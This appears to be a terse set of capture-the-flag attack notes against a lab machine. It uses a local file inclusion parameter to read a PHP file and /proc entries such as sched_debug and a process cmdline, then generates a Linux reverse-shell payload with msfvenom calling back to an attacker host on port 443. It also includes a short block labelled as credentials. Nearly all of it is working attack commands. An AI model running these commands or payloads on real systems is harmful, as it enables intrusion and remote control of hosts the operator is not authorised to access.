```sh
curl -s "http://10.10.11.154/index.php?page=activate_license.php"
curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate
curl -s "http://10.10.11.154/index.php?page=/proc/448/cmdline" --output cmdline
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f py
```

```creds
/usr/bin/activate_license1337

```


